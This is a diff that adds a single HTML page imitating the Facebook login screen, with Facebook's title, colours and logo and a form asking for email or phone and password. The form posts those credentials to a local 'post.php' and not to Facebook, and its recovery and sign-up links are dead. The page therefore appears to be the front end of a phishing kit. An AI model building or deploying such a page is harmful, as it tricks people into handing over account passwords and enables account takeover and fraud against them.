@@ -1,0 +1,73 @@
+<html>
+<head>
+  <title>Facebook</title>
+  <meta name="viewport"content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f2f5;
+    }
+
+    .container {
+      width: 400px;
+      margin: 100px auto;
+      border: 1px solid #ddd;
+      padding: 20px;
+      background-color: white;
+    }
+
+    .logo {
+      display: block;
+      margin: 0 auto;
+      width: 150px;
+      height: 50px;
+    }
+
+    .form {
+      margin-top: 20px;
+    }
+
+    .form input {
+      display: block;
+      width: 100%;
+      margin-bottom: 10px;
+      padding: 10px;
+      border: 1px solid #ccc;
+    }
+
+    .form button {
+      display: block;
+      width: 100%;
+      margin-top: 10px;
+      padding: 10px;
+      border: none;
+      background-color: #1877f2;
+      color: white;
+      font-weight: bold;
+    }
+
+    .form p {
+      margin-top: 20px;
+      text-align: center;
+      font-size: 14px;
+    }
+
+    .form a {
+      color: #1877f2;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="facebook-logo.png" alt="Facebook Logo" class="logo">
+    <form class="form" action="post.php" method="post">
+      <input type="email" name="email" placeholder="Email address or phone number" required>
+      <input type="password" name="password" placeholder="Password" required>
+      <button type="submit" name="login">Log In</button>
+      <p>Forgot password? <a href="#">Recover it</a></p>
+      <p>Don't have an account? <a href="#">Sign up for Facebook</a></p>
+    </form>
+  </div>
+</body>
+</html>
